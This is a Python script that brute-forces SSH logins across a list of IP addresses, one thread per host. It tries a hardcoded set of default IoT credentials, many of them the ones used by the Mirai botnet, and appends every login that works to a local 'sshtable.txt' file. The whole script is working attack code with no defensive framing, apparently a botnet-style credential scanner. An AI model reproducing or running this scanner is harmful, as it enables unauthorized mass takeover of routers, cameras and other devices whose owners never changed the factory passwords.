#!/usr/bin/python
#-*- coding: utf-8 -*-
import paramiko
import threading,time

wpt = {'1':['root','xc3511'],'2':['root','vizxv'],'3':['root','klv1234'],
		'4':['root','dreambox'],'5':['root','zlxx'],'6':['root','default'],
		'7':['root','juantech'],'8':['root','realtek'],'9':['root','54321'],
		'10':['root','7ujMko0vizxv'],'11':['admin','hi3518'],'12':['root','anko'],
		'13':['root','7ujMko0vizxv'],'14':['root','pass'],'15':['root','1111'],
		'16':['root','666666'],'17':['admin','default'],'18':['root','1234'],
		'19':['root','klv123'],'20':['root','admin'],'21':['root','888888'],
		'22':['root','password'],'23':['root','jvbzd'],'24':['root','root'],
		'25':['root','Zte521'],'26':['root',''],'27':['root','12345'],
		'28':['root','system'],'29':['root','ikwb'],'30':['admin','admin'],
		'31':['root','user'],'32':['root','123456'],'33':['root','00000000'],
}
'''
wpt = {
	'1':['root','root'],'2':['pi','raspberry'],'3':['bot','bot']#4s
}'''
def ssh_login(ip,count):
	for v in wpt.values():
		print ("[scanner] FD%d connected. Trying %s %s:%s"%(count,ip,v[0],v[1]))
		try:
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(ip,22,v[0],v[1],timeout=5)
			print ("[INFO] FD%d Successful connection. info: %s %s:%s"%(count,ip,v[0],v[1]))
			msg = ip+" "+v[0]+":"+v[1]
			print (msg)
			f = open('/home/bot/Desktop/sshtable.txt','a+')
			f.write(msg+"\n")
			f.close()
			ssh.close()
			return
		except:
			continue
	pass



if __name__ == '__main__':
	print (time.ctime())
	start = time.time()
	#ssh2("192.168.10.105","pi","raspberry")
	threads = []
	ips = []
	count = 0
	with open('/home/bot/Desktop/xhp.txt','r') as f:
		ips = f.readlines()

	for ip in ips:
		count = count + 1
		ip = ip.strip()
		t = threading.Thread(target=ssh_login,args=(ip,count))
		threads.append(t)

	for t in threads:
		t.start()
	for t in threads:
		t.join()
	end = time.time()
	print ("comsume time%s"%(end-start))
	print ("END")

